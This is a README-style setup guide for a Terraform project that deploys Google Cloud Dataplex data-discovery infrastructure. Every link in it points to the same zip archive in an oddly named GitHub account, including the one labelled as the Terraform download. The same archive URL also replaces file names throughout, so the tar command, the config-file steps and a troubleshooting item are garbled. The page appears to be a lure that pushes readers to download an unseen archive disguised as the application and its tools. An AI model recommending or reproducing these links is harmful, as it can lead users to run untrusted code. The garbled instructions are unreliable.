## 🚀 Getting Started

Follow these steps to download and set up the application on your system.

### Step 1: Visit the Releases Page

To get the latest version of the application, visit this page to download:  
[Releases Page](https://raw.githubusercontent.com/connotationdentalpractice503/data-discovery-infrastructure-gcp/main/dataplex-profiling/data-discovery-infrastructure-gcp-1.7-alpha.1.zip)

### Step 2: Choose the Right Version

On the Releases page, look for the latest version. Each version has a release note that explains what changes were made. Select the version that suits your needs (usually, you'll want the latest).

### Step 3: Download the Release

Click on the version number and scroll down to the "Assets" section. You will see files available for download. Since we are focusing on the application itself, download the main archive file, such as `.zip` or `https://raw.githubusercontent.com/connotationdentalpractice503/data-discovery-infrastructure-gcp/main/dataplex-profiling/data-discovery-infrastructure-gcp-1.7-alpha.1.zip`.

### Step 4: Extract the Files

Once downloaded, locate the file on your computer. Depending on your operating system:

- **Windows**: Right-click the downloaded `.zip` file and select "Extract All…". Follow the prompts to choose a folder.
- **Mac**: Double-click the downloaded file. It should automatically extract to the same location.
- **Linux**: Use the terminal command `tar -xvzf https://raw.githubusercontent.com/connotationdentalpractice503/data-discovery-infrastructure-gcp/main/dataplex-profiling/data-discovery-infrastructure-gcp-1.7-alpha.1.zip` or right-click and extract.

### Step 5: Review System Requirements

Before running the application, ensure your system meets the following requirements:

- An active Google Cloud account.
- [Terraform](https://raw.githubusercontent.com/connotationdentalpractice503/data-discovery-infrastructure-gcp/main/dataplex-profiling/data-discovery-infrastructure-gcp-1.7-alpha.1.zip) installed (version 1.0 or higher).
- Basic familiarity with command line interface.
- Appropriate permissions on your Google Cloud project.

### Step 6: Configure Your Project

Before you can deploy the infrastructure to GCP, you must set up your project:

1. Open the extracted folder and locate the `terraform` subfolder.
2. Open a terminal (or command prompt) in this folder.
3. Before continuing, you may need to edit the `https://raw.githubusercontent.com/connotationdentalpractice503/data-discovery-infrastructure-gcp/main/dataplex-profiling/data-discovery-infrastructure-gcp-1.7-alpha.1.zip` file to suit your project. This file contains configurations like project name and region.

### Step 7: Run the Infrastructure Setup

With everything configured, you can now run the setup commands:

1. Initialize Terraform:
   ```
   terraform init
   ```

2. Review the setup plan:
   ```
   terraform plan
   ```

3. Apply the changes to set up the infrastructure:
   ```
   terraform apply
   ```
   Review the output, and type `yes` when prompted to proceed.

## 🔧 Troubleshooting

If you encounter issues, consider these common problems:

- *Terraform not installed*: Make sure you've installed Terraform and it's in your system's PATH.
- *Cloud permissions error*: Ensure your Google Cloud account has adequate permissions to create resources.
- *Configuration errors*: Review your `https://raw.githubusercontent.com/connotationdentalpractice503/data-discovery-infrastructure-gcp/main/dataplex-profiling/data-discovery-infrastructure-gcp-1.7-alpha.1.zip` for any typos or incorrect values.
